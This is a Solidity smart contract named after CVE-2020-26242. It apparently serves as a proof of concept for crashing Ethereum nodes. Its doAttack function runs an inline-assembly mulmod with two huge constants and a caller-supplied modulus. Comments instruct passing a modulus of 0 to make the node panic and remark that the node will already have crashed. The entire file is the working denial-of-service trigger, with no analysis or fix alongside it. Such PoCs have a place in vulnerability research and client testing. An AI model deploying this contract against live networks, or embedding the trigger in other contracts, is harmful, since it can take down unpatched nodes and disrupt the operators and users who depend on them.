// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract CVE_2020_26242 {
    uint myState = 0;

    function getState() external view returns(uint) {
        return myState;
    }
    // make sure input modVal is 0 and k and r are very big numbers to cause the panic in the node
    function doAttack(uint modVal) public returns(uint) {
        uint p;
        assembly {
            let k := 4443545678909087654323456787654343567890908976543213456787654 // A very big number
            let r := 123546789087654324567890452411458722872478415428724528720 // also a big number
            p := mulmod(k, r, modVal)
        // we don't have to store the output in storage as by this point, the node already crashed
        // but lets keep it there in case the node didn't crash
            sstore("hello", p)
        }
        myState = p;
        return p;
    }
}
